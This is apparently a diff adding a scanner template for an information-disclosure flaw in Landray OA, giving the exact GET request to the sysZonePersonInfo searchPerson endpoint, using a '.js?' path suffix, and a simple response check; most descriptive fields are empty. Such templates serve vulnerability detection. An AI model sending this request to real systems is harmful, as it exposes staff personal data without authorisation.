@@ -1,0 +1,22 @@
+id:
+
+info:
+  name: 蓝凌OA syszonepersoninfo 接口处存在信息泄露
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=20&s_ajax=true
+  headers:
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+response1:
+  body: title
+  code:
+requests2:
+response2:
